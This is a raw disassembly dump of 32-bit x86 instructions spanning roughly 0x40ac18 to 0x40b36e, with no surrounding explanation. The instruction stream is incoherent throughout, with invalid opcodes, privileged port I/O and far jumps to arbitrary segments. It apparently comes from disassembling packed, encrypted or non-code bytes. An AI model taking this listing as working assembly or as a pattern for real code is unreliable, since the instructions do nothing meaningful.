  40ac18:	xchg   esp,eax
  40ac19:	dec    esp
  40ac1a:	psadbw mm5,mm7
  40ac1d:	xchg   edx,eax
  40ac1e:	mov    bh,0x9b
  40ac20:	cmc    
  40ac21:	add    BYTE PTR [ebx],bh
  40ac23:	jno    0x40ac45
  40ac25:	shl    BYTE PTR [ecx],1
  40ac27:	loop   0x40abbb
  40ac29:	outs   dx,BYTE PTR ds:[esi]
  40ac2a:	rcl    BYTE PTR fs:[ebp-0x2c],0x11
  40ac2f:	cwde   
  40ac30:	mov    esi,0x95763e79
  40ac35:	outs   dx,DWORD PTR ds:[esi]
  40ac36:	xchg   bh,ah
  40ac38:	cdq    
  40ac39:	add    ah,0x3c
  40ac3c:	inc    ebx
  40ac3d:	jb     0x40abd2
  40ac3f:	ror    eax,0xc9
  40ac42:	adc    edi,edx
  40ac44:	ret    
  40ac45:	sti    
  40ac46:	inc    ecx
  40ac47:	sar    ch,1
  40ac49:	call   0xd2c5:0x24ff99f9
  40ac50:	mov    ds:0x11a593eb,eax
  40ac55:	mov    eax,0x1dd02f0b
  40ac5a:	mov    DWORD PTR [edx-0x18],ebp
  40ac5d:	jp     0x40ac7c
  40ac5f:	pop    eax
  40ac60:	pop    ebx
  40ac61:	sub    ch,BYTE PTR [esi+0x39b9425c]
  40ac67:	add    eax,0xb8415603
  40ac6c:	pop    ds
  40ac6d:	in     al,dx
  40ac6e:	mov    WORD PTR [ebp-0x21],?
  40ac71:	pop    edx
  40ac72:	push   ebp
  40ac73:	sbb    al,0xad
  40ac75:	sbb    ah,ah
  40ac77:	pushf  
  40ac78:	imul   BYTE PTR [eax]
  40ac7a:	aaa    
  40ac7b:	imul   esi,DWORD PTR [edx],0xc54aedc0
  40ac81:	fcomp  st(7)
  40ac83:	dec    edx
  40ac84:	xor    BYTE PTR [ecx],ah
  40ac86:	out    0xec,eax
  40ac88:	pop    eax
  40ac89:	sub    ebx,ecx
  40ac8b:	sbb    DWORD PTR [esi],esi
  40ac8d:	push   ss
  40ac8e:	out    0x90,al
  40ac90:	shr    DWORD PTR [ebx],0xe4
  40ac93:	fld    st(5)
  40ac95:	out    0x4f,al
  40ac97:	mov    dl,0xee
  40ac99:	cmc    
  40ac9a:	jge    0x40ac8b
  40ac9c:	mov    ebx,0x3f1134f
  40aca1:	or     eax,0x334b0849
  40aca6:	sar    ebx,1
  40aca8:	jmp    0x3806:0x96760579
  40acaf:	nop
  40acb0:	mov    edx,0x5d89c289
  40acb5:	mov    bl,bl
  40acb7:	sbb    eax,0x2ab40cb0
  40acbc:	retf   
  40acbd:	fdiv   DWORD PTR [edi]
  40acbf:	fwait
  40acc0:	pop    ebp
  40acc1:	push   ebx
  40acc2:	jno    0x40acef
  40acc4:	sub    ebx,DWORD PTR [ebx+0x60a9271d]
  40acca:	fbstp  TBYTE PTR [eax]
  40accc:	mov    al,0x91
  40acce:	sti    
  40accf:	pop    edx
  40acd0:	dec    ebp
  40acd1:	fist   WORD PTR [ebp-0xb]
  40acd4:	push   es
  40acd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd6:	jb     0x40ad04
  40acd8:	lock inc esp
  40acda:	jmp    0x4f58:0xa2e854fc
  40ace1:	sbb    esi,DWORD PTR [edx-0x27]
  40ace4:	pop    esi
  40ace5:	je     0x40ac6a
  40ace7:	imul   ebp,esi,0xcb5e5d5a
  40aced:	inc    eax
  40acee:	in     eax,0xb5
  40acf0:	pop    esp
  40acf1:	or     DWORD PTR gs:[ebp+0x0],edi
  40acf5:	ins    BYTE PTR es:[edi],dx
  40acf6:	fimul  DWORD PTR [edx-0x3b]
  40acf9:	ret    
  40acfa:	fldl2t 
  40acfc:	out    dx,al
  40acfd:	jno    0x40ad2c
  40acff:	repnz aas 
  40ad01:	mov    ecx,0xe58e196d
  40ad06:	push   ss
  40ad07:	dec    ebx
  40ad08:	mov    bl,0x63
  40ad0a:	xlat   BYTE PTR ds:[ebx]
  40ad0b:	popf   
  40ad0c:	fisubr WORD PTR [eax+edx*8-0x6af0f186]
  40ad13:	adc    cl,bh
  40ad15:	leave  
  40ad16:	(bad)  
  40ad17:	and    bh,BYTE PTR [ebp-0x1d]
  40ad1a:	les    edx,FWORD PTR [edi]
  40ad1c:	sbb    BYTE PTR [edi-0x67],cl
  40ad1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad20:	inc    esi
  40ad21:	xchg   edx,eax
  40ad22:	xor    al,0x80
  40ad24:	(bad)  
  40ad26:	cli    
  40ad27:	cmp    eax,eax
  40ad29:	arpl   WORD PTR [edi+0xc],bx
  40ad2c:	ds sbb ebp,eax
  40ad2f:	aam    0x4b
  40ad31:	scas   eax,DWORD PTR es:[edi]
  40ad32:	sar    ah,0x22
  40ad35:	adc    DWORD PTR [edx],ebx
  40ad37:	and    BYTE PTR [edx-0x26],dl
  40ad3a:	inc    BYTE PTR [ebx-0x1148e3d3]
  40ad40:	imul   ebx,DWORD PTR [edx+0x41],0x369a804e
  40ad47:	xchg   edi,eax
  40ad48:	sbb    ecx,edx
  40ad4a:	xchg   ebx,eax
  40ad4b:	and    BYTE PTR [eax-0x28],0xaa
  40ad4f:	xor    ebx,DWORD PTR [ecx+0x1a6647d4]
  40ad55:	outs   dx,BYTE PTR ds:[esi]
  40ad56:	and    BYTE PTR [eax-0x34],al
  40ad59:	add    esi,DWORD PTR [ecx-0x4e]
  40ad5c:	lods   al,BYTE PTR ds:[esi]
  40ad5d:	pop    edi
  40ad5e:	mov    ebp,0xf6455026
  40ad63:	add    al,0xe5
  40ad65:	imul   ebx,edx,0x41
  40ad68:	(bad)
  40ad6b:	mov    ds:0x9f17c63,eax
  40ad70:	in     eax,0x9a
  40ad72:	(bad)  
  40ad73:	cld    
  40ad74:	mov    dl,0xab
  40ad76:	mov    ah,0x7a
  40ad78:	xchg   ecx,eax
  40ad79:	fst    DWORD PTR [edi-0x55]
  40ad7c:	inc    ebp
  40ad7d:	jg     0x40adb5
  40ad7f:	pop    es
  40ad80:	dec    edx
  40ad81:	retf   
  40ad82:	jbe    0x40ad23
  40ad84:	outs   dx,BYTE PTR gs:[esi]
  40ad86:	mov    ah,0xa2
  40ad88:	dec    ebx
  40ad89:	adc    dh,bl
  40ad8b:	ss cmp eax,0xaea71773
  40ad91:	sbb    eax,0x6ac68b0e
  40ad96:	leave  
  40ad97:	fucomip st,st(1)
  40ad99:	shl    eax,1
  40ad9b:	fcomp  st(5)
  40ad9d:	dec    esp
  40ad9e:	loopne 0x40ad83
  40ada0:	icebp  
  40ada1:	jp     0x40ad3d
  40ada3:	mov    al,0xb1
  40ada5:	or     al,0xc0
  40ada7:	out    dx,eax
  40ada8:	cli    
  40ada9:	mov    DWORD PTR [ebp+eiz*1-0x1b],ecx
  40adad:	aas    
  40adae:	cwde   
  40adaf:	xchg   ecx,eax
  40adb0:	xchg   esp,eax
  40adb1:	shl    ch,0xdf
  40adb4:	push   eax
  40adb5:	push   ds
  40adb6:	cli    
  40adb7:	leave  
  40adb8:	sbb    eax,edi
  40adba:	ret    0x9a27
  40adbd:	icebp  
  40adbe:	pop    esp
  40adbf:	xor    DWORD PTR [eax],ecx
  40adc1:	sbb    eax,0xb270c010
  40adc6:	lds    edx,FWORD PTR [edx+0x184790bd]
  40adcc:	rcl    bh,cl
  40adce:	xchg   edx,eax
  40adcf:	and    BYTE PTR [esi+0x78],cl
  40add2:	ficom  DWORD PTR [esi]
  40add4:	push   esp
  40add5:	ds inc esp
  40add7:	fdivr  st,st(6)
  40add9:	dec    BYTE PTR [edx]
  40addb:	cmc    
  40addc:	pop    ecx
  40addd:	outs   dx,BYTE PTR ds:[esi]
  40adde:	push   edi
  40addf:	cwde   
  40ade0:	(bad)  
  40ade1:	cs sbb al,0xbc
  40ade4:	cs pop ss
  40ade6:	mov    bl,0x81
  40ade8:	mov    esp,0xb652c878
  40aded:	dec    esp
  40adee:	ret    
  40adef:	inc    ecx
  40adf0:	cmp    eax,ecx
  40adf2:	icebp  
  40adf3:	es ins DWORD PTR es:[edi],dx
  40adf5:	adc    BYTE PTR [eax+esi*4],bh
  40adf8:	adc    al,0xd8
  40adfa:	pop    ecx
  40adfb:	aad    0x25
  40adfd:	push   eax
  40adfe:	lods   al,BYTE PTR ds:[esi]
  40adff:	adc    BYTE PTR [esi-0x272f3517],0x10
  40ae06:	fsub   QWORD PTR [ebx+0x71d21e43]
  40ae0c:	test   eax,0xa1c2d38c
  40ae11:	cmp    al,0xf5
  40ae13:	lock mov ecx,DWORD PTR [eax-0x5b]
  40ae17:	jo     0x40ae33
  40ae19:	gs cdq 
  40ae1b:	push   edx
  40ae1c:	pop    eax
  40ae1d:	sbb    esp,DWORD PTR [esi]
  40ae1f:	sub    eax,0x19329325
  40ae24:	inc    bx
  40ae26:	aad    0x1f
  40ae28:	sbb    edx,DWORD PTR [ebx-0x37173d15]
  40ae2e:	fiadd  WORD PTR [ebp+edx*4-0x54c97841]
  40ae35:	jle    0x40ae59
  40ae37:	cmp    edi,DWORD PTR [edi+0x6d]
  40ae3a:	inc    edx
  40ae3b:	adc    BYTE PTR [edx+edi*8],ah
  40ae3e:	xchg   edi,eax
  40ae3f:	pusha  
  40ae40:	jno    0x40ae5f
  40ae42:	shr    BYTE PTR [edx+0x6d],1
  40ae45:	scas   al,BYTE PTR es:[edi]
  40ae46:	xchg   DWORD PTR [ebx+edi*2+0x7c],esp
  40ae4a:	ja     0x40ae36
  40ae4c:	and    bh,BYTE PTR [edx+0x4c]
  40ae4f:	outs   dx,BYTE PTR ds:[esi]
  40ae50:	(bad)  
  40ae51:	xor    al,0xa9
  40ae53:	out    0xb7,eax
  40ae55:	lock outs dx,DWORD PTR ds:[esi]
  40ae57:	ins    BYTE PTR es:[edi],dx
  40ae58:	lahf   
  40ae59:	sub    ecx,DWORD PTR ds:0x459012d4
  40ae5f:	js     0x40ae6d
  40ae61:	es pusha 
  40ae63:	or     eax,0xd3d1f3cf
  40ae68:	mov    ds:0x3a499a9a,al
  40ae6d:	pop    edx
  40ae6e:	sbb    al,0xc7
  40ae70:	sub    DWORD PTR [esi+0x1dddb9c6],esp
  40ae76:	fwait
  40ae77:	scas   al,BYTE PTR es:[edi]
  40ae78:	mov    cl,0x15
  40ae7a:	pusha  
  40ae7b:	cli    
  40ae7c:	xchg   BYTE PTR [esi],cl
  40ae7e:	sub    ah,cl
  40ae80:	addr16 mov ebx,0x5aa1a755
  40ae86:	pop    eax
  40ae87:	pop    ebx
  40ae88:	adc    bl,BYTE PTR [ebp+0x21f0d01c]
  40ae8e:	sub    dh,BYTE PTR [edi]
  40ae90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae91:	xlat   BYTE PTR ds:[ebx]
  40ae92:	mov    edx,0x41fd2bcf
  40ae97:	cmp    DWORD PTR [ecx],esp
  40ae99:	rcr    BYTE PTR [ebp+0x49],cl
  40ae9c:	and    ebx,edi
  40ae9e:	pop    edi
  40ae9f:	aam    0xb
  40aea1:	imul   eax,DWORD PTR [ebx],0xf276da23
  40aea7:	mov    al,ds:0xd1bfe6be
  40aeac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aead:	dec    esp
  40aeae:	gs das 
  40aeb0:	jl     0x40aedd
  40aeb2:	popf   
  40aeb3:	adc    BYTE PTR [edi+0x49dcbc3a],0xbc
  40aeba:	mov    WORD PTR [eax+0x3f07e5f3],?
  40aec0:	ficom  WORD PTR [ebp+eiz*2-0x6c]
  40aec4:	pop    esi
  40aec5:	cmp    al,0xc0
  40aec7:	mov    WORD PTR [eax],?
  40aec9:	repnz xchg ebx,eax
  40aecb:	dec    ecx
  40aecc:	test   BYTE PTR [esi],0x27
  40aecf:	pop    ebx
  40aed0:	jb     0x40aed9
  40aed2:	cmc    
  40aed3:	sbb    esp,esi
  40aed5:	fwait
  40aed6:	push   ecx
  40aed7:	stos   DWORD PTR es:[edi],eax
  40aed8:	inc    esp
  40aed9:	sub    esp,ebx
  40aedb:	pop    ss
  40aedc:	icebp  
  40aedd:	rol    eax,1
  40aedf:	sahf   
  40aee0:	xchg   ecx,eax
  40aee1:	adc    eax,0x940146ad
  40aee6:	inc    edi
  40aee7:	ror    DWORD PTR [edx],0x40
  40aeea:	out    0x19,al
  40aeec:	pop    ebp
  40aeed:	push   0x51
  40aeef:	xchg   esp,eax
  40aef0:	pop    ebx
  40aef1:	mov    ebp,0x59f9e414
  40aef6:	push   ecx
  40aef7:	xlat   BYTE PTR ds:[ebx]
  40aef8:	pop    edi
  40aef9:	and    DWORD PTR [esi+0x38],0x31
  40aefd:	cmp    al,0xa
  40aeff:	mov    dh,0x63
  40af01:	add    BYTE PTR [ebx-0x75],dh
  40af04:	or     DWORD PTR [edi+ebp*2+0xae5fd1f],0xe810421a
  40af0f:	mov    esp,0xc7d4d45e
  40af14:	sbb    al,0x83
  40af16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af17:	scas   eax,DWORD PTR es:[edi]
  40af18:	adc    al,BYTE PTR [edx-0x5607c48d]
  40af1e:	das    
  40af1f:	mov    dh,0x48
  40af21:	or     BYTE PTR [eax+0x3e],dh
  40af24:	push   esi
  40af25:	outs   dx,DWORD PTR ds:[esi]
  40af26:	loop   0x40af4b
  40af28:	ret    
  40af29:	in     al,dx
  40af2a:	lock loopne 0x40aede
  40af2d:	push   esp
  40af2e:	sbb    ah,0xbc
  40af31:	fld    st(2)
  40af33:	mov    ch,0xb1
  40af35:	lahf   
  40af36:	imul   edx,DWORD PTR [edx+ebp*2],0x9587ddd8
  40af3d:	jnp    0x40af4d
  40af3f:	(bad)  
  40af40:	loopne 0x40afa8
  40af42:	fwait
  40af43:	pop    esp
  40af44:	das    
  40af45:	push   esi
  40af46:	mov    ebp,0xc0a2a525
  40af4b:	shr    DWORD PTR [ecx-0x41a05ef8],1
  40af51:	or     DWORD PTR [edx+0x2c6e5be1],0x63cf281f
  40af5b:	loopne 0x40aee5
  40af5d:	inc    ebx
  40af5e:	xchg   esi,edx
  40af60:	mov    dl,0x8d
  40af62:	xchg   ebp,eax
  40af63:	mov    bl,bh
  40af65:	aas    
  40af66:	jb     0x40aef4
  40af68:	hlt    
  40af69:	push   ebx
  40af6a:	push   esi
  40af6b:	add    dh,BYTE PTR [ecx]
  40af6d:	xor    al,bh
  40af6f:	push   es
  40af70:	out    0x4d,al
  40af72:	push   es
  40af73:	subps  xmm7,xmm7
  40af76:	fild   WORD PTR [edx-0x232177fd]
  40af7c:	sahf   
  40af7d:	pop    ds
  40af7e:	arpl   WORD PTR [ebp+ebp*2-0xf8f3fc7],bp
  40af85:	out    0xb6,al
  40af87:	repz push cx
  40af8a:	sub    dl,bl
  40af8c:	inc    ebx
  40af8d:	cwde   
  40af8e:	and    bl,BYTE PTR [ebx+0x4441b367]
  40af94:	stos   BYTE PTR es:[edi],al
  40af95:	jbe    0x512d7d9
  40af9b:	ret    
  40af9c:	int3   
  40af9d:	dec    eax
  40af9e:	imul   ebx,DWORD PTR [edi+0x4da7c11c],0xffffffe1
  40afa5:	inc    eax
  40afa6:	sub    al,0x37
  40afa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa9:	stos   BYTE PTR es:[edi],al
  40afaa:	jecxz  0x40afa7
  40afac:	xchg   edx,eax
  40afad:	call   0x7b3bb49f
  40afb2:	mov    eax,ds:0x21e65bfd
  40afb7:	and    ch,BYTE PTR [eax+0x56]
  40afba:	jbe    0x40afaf
  40afbc:	mov    edx,0xbb71a308
  40afc1:	add    BYTE PTR [ecx+0x40483af5],0xda
  40afc8:	jge    0x40af50
  40afca:	outs   dx,BYTE PTR ds:[esi]
  40afcb:	push   ecx
  40afcc:	pop    esp
  40afcd:	and    edi,esi
  40afcf:	push   0x59345865
  40afd4:	leave  
  40afd5:	int3   
  40afd6:	int3   
  40afd7:	mov    al,0xb0
  40afd9:	aad    0x36
  40afdb:	sbb    cl,BYTE PTR [eiz*8+0x6b1788b]
  40afe2:	xor    DWORD PTR [eax],edi
  40afe4:	rcl    DWORD PTR [ecx+0x25],1
  40afe7:	leave  
  40afe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afe9:	mov    esp,0x5bea59ad
  40afee:	mov    al,0x61
  40aff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aff1:	cmp    BYTE PTR [esi+0x7b],ah
  40aff4:	sbb    edx,ebx
  40aff6:	mov    ebx,0x2fa5077a
  40affb:	mov    ds:0x35da5592,al
  40b000:	push   esi
  40b001:	mov    esp,0xdb72ebf5
  40b006:	jae    0x40b011
  40b008:	sbb    al,0x38
  40b00a:	addr16 mov al,fs:0x137a
  40b00f:	int3   
  40b010:	xchg   esi,eax
  40b011:	jnp    0x40aff7
  40b013:	in     al,0x75
  40b015:	push   cs
  40b016:	xchg   edx,eax
  40b017:	fyl2x  
  40b019:	jl     0x40afb2
  40b01b:	repz gs mov al,0x8c
  40b01f:	jb     0x40b040
  40b021:	(bad)  ds:0xd969465d
  40b027:	push   es
  40b028:	push   esi
  40b029:	pop    edi
  40b02a:	sub    bl,BYTE PTR [ebp-0x4f37c36a]
  40b030:	xchg   ebp,eax
  40b031:	test   eax,0x1e494e86
  40b036:	dec    esp
  40b037:	jge    0x40b078
  40b039:	shl    BYTE PTR ds:0x92bfeaf6,1
  40b03f:	push   DWORD PTR [ebp+0x48]
  40b042:	(bad)  
  40b043:	pop    esp
  40b044:	push   edi
  40b045:	inc    edi
  40b046:	mov    dl,0xc1
  40b048:	gs xchg esp,eax
  40b04a:	pop    ds
  40b04b:	repz add DWORD PTR [edi],esp
  40b04e:	jne    0x40b0b1
  40b050:	nop
  40b051:	pushf  
  40b052:	or     BYTE PTR [eax-0x582cb5c7],ch
  40b058:	add    bl,BYTE PTR [ebx-0x6d]
  40b05b:	add    ecx,esp
  40b05d:	jno    0x40b017
  40b05f:	test   DWORD PTR [eax-0x3b14a5c7],eax
  40b065:	repnz xchg ebx,eax
  40b067:	int3   
  40b068:	jg     0x40b087
  40b06a:	dec    edi
  40b06b:	adc    BYTE PTR [ebp+0x68],dl
  40b06e:	and    BYTE PTR [esi+esi*1],0x71
  40b072:	sar    BYTE PTR [ecx],0x49
  40b075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b077:	lahf   
  40b078:	adc    eax,0x7951af9f
  40b07d:	mov    cl,0x8d
  40b07f:	and    al,0x2e
  40b081:	sub    BYTE PTR [ebp+0x4d],bl
  40b084:	rol    BYTE PTR [edx-0x45db88ec],cl
  40b08a:	retf   
  40b08b:	xchg   eax,edi
  40b08d:	scas   eax,DWORD PTR es:[edi]
  40b08e:	in     eax,dx
  40b08f:	add    BYTE PTR [esi+0x54639292],0x7
  40b096:	pop    esp
  40b097:	or     al,0x26
  40b099:	or     ah,ah
  40b09b:	add    esp,DWORD PTR [esi+0x177def00]
  40b0a1:	in     eax,0x1
  40b0a3:	mov    dh,0xfb
  40b0a5:	dec    eax
  40b0a6:	pop    eax
  40b0a7:	inc    eax
  40b0a8:	lock and bl,ah
  40b0ab:	ins    DWORD PTR es:[edi],dx
  40b0ac:	adc    BYTE PTR [ebx+0x410d2d25],0x21
  40b0b3:	sti    
  40b0b4:	div    DWORD PTR [edi-0x5f]
  40b0b7:	cmp    eax,0x608cff66
  40b0bc:	push   ss
  40b0bd:	fwait
  40b0be:	sub    DWORD PTR [esi],ecx
  40b0c0:	pop    ebp
  40b0c1:	dec    ebp
  40b0c2:	inc    esp
  40b0c3:	xor    eax,0xf37c6642
  40b0c8:	sbb    eax,0xa99174b3
  40b0cd:	push   edi
  40b0ce:	or     DWORD PTR [esi+0x18],ecx
  40b0d1:	xor    ecx,eax
  40b0d3:	dec    ecx
  40b0d4:	call   0xc92a:0x280bbf19
  40b0db:	dec    edi
  40b0dc:	push   cs
  40b0dd:	jp     0x40b08f
  40b0df:	call   0xf8d4305e
  40b0e4:	inc    ebx
  40b0e5:	hlt    
  40b0e6:	dec    ecx
  40b0e7:	test   DWORD PTR [esi-0x10c8c9f5],ebx
  40b0ed:	sbb    BYTE PTR [ebx+0x4],0xf9
  40b0f1:	test   eax,0x7d0b8a1f
  40b0f6:	rol    BYTE PTR [ebp+eax*4+0x62],cl
  40b0fa:	cmp    DWORD PTR [ecx+0x60],ecx
  40b0fd:	es ins BYTE PTR es:[edi],dx
  40b0ff:	(bad)  
  40b100:	sbb    al,0xdf
  40b102:	jmp    0xae9c:0x33b674a8
  40b109:	shl    BYTE PTR [eax],1
  40b10b:	push   cs
  40b10c:	lock lds ebx,FWORD PTR [ebx]
  40b10f:	ins    BYTE PTR es:[edi],dx
  40b110:	or     eax,0x468e49f
  40b115:	das    
  40b116:	scas   eax,DWORD PTR es:[edi]
  40b117:	sar    DWORD PTR [bx+0x622f],cl
  40b11c:	bound  ecx,QWORD PTR [edi-0x5c]
  40b11f:	xchg   esp,eax
  40b120:	in     al,dx
  40b121:	add    bl,0x3f
  40b124:	ja     0x40b107
  40b126:	and    eax,0xac1f666
  40b12b:	push   ss
  40b12c:	(bad)  
  40b12d:	fadd   QWORD PTR [ebx]
  40b12f:	sub    DWORD PTR [esi-0x656af7a2],esi
  40b135:	jmp    0x40b1ab
  40b137:	mov    ebp,0x4cc1f21f
  40b13c:	je     0x40b160
  40b13e:	pop    ebp
  40b13f:	adc    DWORD PTR [edx-0x1bb6cfb],0xbbe5723c
  40b149:	and    dh,BYTE PTR [edx+0x54]
  40b14c:	lea    esp,[ebx]
  40b14e:	xchg   ecx,eax
  40b14f:	push   0x37
  40b151:	cmp    dl,bh
  40b153:	psllq  mm2,QWORD PTR [edi-0xd]
  40b157:	ficom  WORD PTR [esi+ebx*4-0x48]
  40b15b:	add    dh,BYTE PTR [esi-0x4a]
  40b15e:	les    esp,FWORD PTR [ecx]
  40b160:	aaa    
  40b161:	jnp    0x40b149
  40b163:	mov    ebx,0x3f97a740
  40b168:	mov    ebx,0x117abd64
  40b16d:	out    0x39,eax
  40b16f:	dec    edi
  40b170:	aaa    
  40b171:	pop    edx
  40b172:	push   ss
  40b173:	aaa    
  40b174:	mov    ch,BYTE PTR [ebp-0x77]
  40b177:	xchg   ebx,eax
  40b178:	in     eax,0xd4
  40b17a:	fwait
  40b17b:	add    DWORD PTR [ebx+0x9f501ae],edx
  40b181:	popa   
  40b182:	and    al,0x6b
  40b184:	dec    ecx
  40b185:	inc    ebx
  40b186:	outs   dx,DWORD PTR ds:[esi]
  40b187:	cmp    ebp,DWORD PTR [edi-0x253b5ef4]
  40b18d:	xchg   esi,eax
  40b18e:	repnz lods eax,DWORD PTR ds:[esi]
  40b190:	mov    al,ds:0x7a5aaed2
  40b195:	adc    eax,0x546c421f
  40b19a:	stos   BYTE PTR es:[edi],al
  40b19b:	imul   edx,DWORD PTR [ecx+0x5],0xcd15a912
  40b1a2:	mov    bh,0x6b
  40b1a4:	pop    edi
  40b1a5:	mov    ds:0x53bbb3dd,al
  40b1aa:	pop    es
  40b1ab:	sbb    eax,0x4d193d42
  40b1b0:	popf   
  40b1b1:	jmp    0xa50bfb41
  40b1b6:	and    ecx,ebp
  40b1b8:	int    0x26
  40b1ba:	add    al,0x4b
  40b1bc:	je     0x40b1df
  40b1be:	adc    DWORD PTR [edi-0x207f07bb],esi
  40b1c4:	test   edi,ecx
  40b1c6:	(bad)  
  40b1c7:	loop   0x40b1a3
  40b1c9:	mov    ch,0x96
  40b1cb:	push   ebx
  40b1cc:	and    eax,0x24f64dff
  40b1d1:	and    eax,0x26b540bf
  40b1d6:	dec    ecx
  40b1d7:	sbb    esp,0xffffff8f
  40b1da:	dec    esi
  40b1db:	mov    cl,BYTE PTR cs:[edi-0x5fdc40e6]
  40b1e2:	xor    al,0x77
  40b1e4:	enter  0x30f4,0x46
  40b1e8:	adc    BYTE PTR ds:0xb0a49c15,dh
  40b1ee:	addr16 mov eax,0xcf70ca0f
  40b1f4:	loope  0x40b1ac
  40b1f6:	fwait
  40b1f7:	ja     0x40b263
  40b1f9:	gs icebp 
  40b1fb:	(bad)  
  40b1fc:	les    esp,FWORD PTR [esi-0x7f]
  40b1ff:	mov    dl,bl
  40b201:	inc    ebp
  40b202:	xor    edx,esp
  40b204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b205:	pop    esp
  40b206:	xlat   BYTE PTR ds:[ebx]
  40b207:	xor    eax,0xf3193735
  40b20c:	jmp    0xa816ee83
  40b211:	popf   
  40b212:	xchg   ecx,esp
  40b214:	push   edx
  40b215:	call   0x36a:0x8096daf
  40b21c:	xchg   ah,bh
  40b21e:	xchg   esp,eax
  40b21f:	xor    ebp,edx
  40b221:	sub    BYTE PTR [edx+0x69],bh
  40b224:	pop    eax
  40b225:	mov    bh,BYTE PTR [esi-0x6a]
  40b228:	xor    DWORD PTR [esi-0x2d],ecx
  40b22b:	aam    0x9f
  40b22d:	add    ch,BYTE PTR [edx-0xc18a151]
  40b233:	inc    eax
  40b234:	add    DWORD PTR [ebx+0x41f249fc],0x3347e674
  40b23e:	rcr    BYTE PTR [esi+0x6b],cl
  40b241:	fnstsw WORD PTR [edi]
  40b243:	jnp    0x40b1f7
  40b245:	pop    esp
  40b246:	or     eax,0x40f39c
  40b24b:	daa    
  40b24c:	sbb    dh,bh
  40b24e:	or     al,0x9b
  40b250:	retf   
  40b251:	adc    al,0x7c
  40b253:	popf   
  40b254:	pop    ebx
  40b255:	cmp    dh,BYTE PTR [ebx-0x7]
  40b258:	gs push cs
  40b25a:	push   eax
  40b25b:	cli    
  40b25c:	inc    edx
  40b25d:	test   DWORD PTR [eax],eax
  40b25f:	pop    esi
  40b260:	mov    BYTE PTR [ebp-0x7c],ah
  40b263:	cdq    
  40b264:	test   DWORD PTR [eax],ebx
  40b266:	retf   0x6259
  40b269:	test   eax,0x2eee43c7
  40b26e:	sbb    esp,DWORD PTR [edi+0x53]
  40b271:	icebp  
  40b272:	push   0x7a
  40b274:	shl    al,1
  40b276:	and    BYTE PTR [eax+edx*1+0x58fd12e9],al
  40b27d:	ss push ss
  40b27f:	je     0x40b28c
  40b281:	int3   
  40b282:	mov    cl,0x3b
  40b284:	sbb    al,0x14
  40b286:	addr16 lock shr edi,0x3a
  40b28b:	mov    gs,eax
  40b28d:	adc    ecx,DWORD PTR [esi-0x52]
  40b290:	mov    ah,0x6d
  40b292:	out    0xa0,eax
  40b294:	jbe    0x40b269
  40b296:	rcr    DWORD PTR [edx-0x7b72c05],0xdc
  40b29d:	mov    ebx,0x1b4e19e7
  40b2a2:	(bad)  
  40b2a3:	popf   
  40b2a4:	mov    ebx,0xcb484dcc
  40b2a9:	push   ss
  40b2aa:	adc    dl,BYTE PTR [ecx+0x390fbca9]
  40b2b0:	stos   BYTE PTR es:[edi],al
  40b2b1:	and    ebx,DWORD PTR [esi+0x1a]
  40b2b4:	ror    DWORD PTR [ebp+0x7ab14c6d],0xf0
  40b2bb:	gs mov ecx,0x7ef5fa69
  40b2c1:	lods   eax,DWORD PTR ds:[esi]
  40b2c2:	jne    0x40b2c8
  40b2c4:	and    al,0x20
  40b2c6:	xchg   edx,eax
  40b2c7:	test   DWORD PTR [ecx+0x4c666891],ebx
  40b2cd:	mov    edi,0x5dd585e7
  40b2d2:	mov    ecx,0x9ca4c8a0
  40b2d7:	push   edi
  40b2d8:	sti    
  40b2d9:	leave  
  40b2da:	sub    BYTE PTR [eax],cl
  40b2dc:	out    dx,al
  40b2dd:	inc    esi
  40b2de:	pop    esp
  40b2df:	js     0x40b2c4
  40b2e1:	jns    0x40b295
  40b2e3:	inc    esi
  40b2e4:	daa    
  40b2e5:	or     al,0x28
  40b2e7:	and    al,BYTE PTR [esi]
  40b2e9:	test   al,0x29
  40b2eb:	and    dl,BYTE PTR [ebx+0x30]
  40b2ee:	adc    BYTE PTR ds:[edx+0x26],ch
  40b2f2:	xor    ebx,DWORD PTR [esi+0xc3f334d]
  40b2f8:	inc    esp
  40b2f9:	mov    di,0x418e
  40b2fd:	jmp    0x187bd345
  40b302:	outs   dx,DWORD PTR ds:[esi]
  40b303:	nop
  40b304:	pop    edx
  40b305:	aad    0x98
  40b307:	pop    ss
  40b308:	in     al,0xd3
  40b30a:	rol    DWORD PTR [edx+0x96a0973],1
  40b310:	addr16 push ecx
  40b312:	adc    DWORD PTR gs:[edi],ebx
  40b315:	inc    ecx
  40b316:	retf   0xbd93
  40b319:	cdq    
  40b31a:	jo     0x40b368
  40b31c:	es jns 0x40b2d7
  40b31f:	fisubr WORD PTR [eax]
  40b321:	sub    eax,0x4a730b81
  40b326:	imul   eax,DWORD PTR [esi-0x4a],0xff115a14
  40b32d:	(bad)  
  40b32e:	mov    edx,0x380822eb
  40b333:	jb     0x40b38b
  40b335:	mov    ?,eax
  40b337:	jo     0x40b354
  40b339:	push   0x6e69525a
  40b33e:	xor    ebp,esp
  40b340:	fcom   QWORD PTR [esi]
  40b342:	into   
  40b343:	mov    eax,ds:0x47f23bda
  40b348:	adc    al,0xb4
  40b34a:	adc    BYTE PTR [ebx+ebp*1+0x153ebb2a],0xe3
  40b352:	jbe    0x40b2e4
  40b354:	scas   al,BYTE PTR es:[edi]
  40b355:	sbb    esi,DWORD PTR [esi+0x42]
  40b358:	scas   al,BYTE PTR es:[edi]
  40b359:	inc    ecx
  40b35a:	pop    edi
  40b35b:	aas    
  40b35c:	dec    edx
  40b35d:	fdivr  DWORD PTR ds:0x55378ee8
  40b363:	mov    esi,ss
  40b365:	xchg   edi,eax
  40b366:	stc    
  40b367:	test   al,0x19
  40b369:	(bad)  
  40b36a:	jo     0x40b348
  40b36c:	mov    ch,0x3b
  40b36e:	mov    WORD PTR [esi],cs
